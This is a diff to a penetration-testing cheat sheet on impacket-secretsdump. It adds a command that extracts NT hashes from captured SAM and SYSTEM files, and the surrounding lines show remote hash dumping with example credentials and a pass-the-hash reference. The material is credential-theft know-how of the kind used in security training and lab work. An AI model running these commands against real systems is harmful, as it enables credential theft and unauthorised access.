@@ -941,7 +941,12 @@ This tool from impacket uses port 445 to dump SAM hashes that can later be crack
 impacket-secretsdump [[domain/]username[:password]@]<targetName or address> [-outputfile OUTPUTFILE] [-hashes LMHASH:NTHASH] 
 impacket-secretsdump Administrator:December31@192.168.133.153 -outputfile hashes
 ```
-these can later be cracked following [Cracking NT hashes](https://gist.github.com/A-Pisani/a79808e058ccc49bcf71921a05d51f80#cracking-nt-hashes).
+
+This tool allows also to extract all the hashes for you from the SAM file with the following command:
+```
+impacket-secretsdump -sam loot/sam -system loot/system LOCAL
+```
+these can later be cracked following [Cracking NT hashes](https://gist.github.com/A-Pisani/a79808e058ccc49bcf71921a05d51f80#cracking-nt-hashes) or you can pass the hash using them.
 ### Pass the Hash
 The Pass the Hash (PtH) technique allows an attacker to authenticate to a remote system or service using a user's NTLM hash instead of the associated plaintext password. 
 
